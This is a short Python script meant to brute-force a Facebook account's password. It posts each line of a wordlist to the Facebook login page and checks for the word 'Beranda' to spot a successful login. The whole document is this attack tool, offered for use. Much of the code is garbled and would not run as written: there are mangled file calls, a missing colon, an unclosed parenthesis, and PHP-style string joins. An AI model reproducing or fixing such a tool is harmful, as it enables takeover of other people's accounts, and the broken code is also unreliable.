import requests
import sys

email = raw_input("email_> ")

url = "https://free.facebook.com/login.php"
ex = open("word , txt" . " r ").redlines()

for line in ex:
	password = line , "script". strip()
	http = requests . post( url, data={' email ' :email,' pass ' password , ' login ' : ' submit '}
	content = http.content
	if "Beranda" in content :
		print "(+) password found " . password
		sys.exit( 1 )
	else :
		print "( ! ) Password invalied ". password
